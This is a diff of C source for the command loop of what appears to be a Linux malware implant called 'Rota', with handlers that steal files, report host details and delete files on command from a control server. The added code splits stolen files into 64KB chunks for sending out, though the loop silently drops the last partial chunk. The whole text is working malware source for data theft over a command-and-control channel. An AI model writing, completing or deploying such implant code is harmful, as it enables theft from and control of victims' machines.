@@ -145,9 +145,6 @@ void c2_loop() {
             build_c2_response(msg, cmd_id, sock2);
         }
         else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
-
-            //c2_steal_sensitive_info(buffer, cmd_id, sock);
-
             #ifdef DEBUG
             printf("[+] Rota C2 Run steal sensitive data\n");
             #endif
@@ -165,7 +162,19 @@ void c2_loop() {
                 fread(data, sizeof(payload[0]), stats.st_size, fd);
                 fclose(fd);
 
-                build_c2_response(data, cmd_id, sock2);
+                // chunking of large files
+                if (stats.st_size > 65535) {
+                    int remainder = (stats.st_size / 65535);
+                    for (int i = 0; i < remainder; i++) {
+                        char *tmp_buffer = (char *)malloc(65535);
+                        memset(tmp_buffer, 0, 65535);
+                        memcpy(tmp_buffer, &data[(i * 65535)], 65535);
+                        build_c2_response(tmp_buffer, cmd_id, sock2);
+                        free(tmp_buffer);
+                    }
+                } else {
+                    build_c2_response(data, cmd_id, sock2);
+                }
                 free(data);
             } else {
                 char *msg = "file does not exist";
@@ -180,7 +189,7 @@ void c2_loop() {
             char *uname_buffer = (char *)malloc(200);
             c2_upload_device_info(uname_buffer);
             // buffer is now populated as hostname-Linux-kernel-version
-            build_c2_response(uname_buffer, cmd_id, sock);
+            build_c2_response(uname_buffer, cmd_id, sock2);
         }
         else if (memcmp(&rota_c2_upload_file, cmd_id, 4) == 0) {
             #ifdef DEBUG
@@ -231,14 +240,14 @@ void c2_loop() {
                     #endif
 
                     char *msg = "file deleted";
-                    build_c2_response(msg, cmd_id, sock);
+                    build_c2_response(msg, cmd_id, sock2);
                     break;
                 } else {
                     #ifdef DEBUG
                     printf("file deletion of %s was unsuccessful", payload);
                     #endif
                     char *msg = "file could not be deleted";
-                    build_c2_response(msg, cmd_id, sock);
+                    build_c2_response(msg, cmd_id, sock2);
                 }
             } else {
                     #ifdef DEBUG
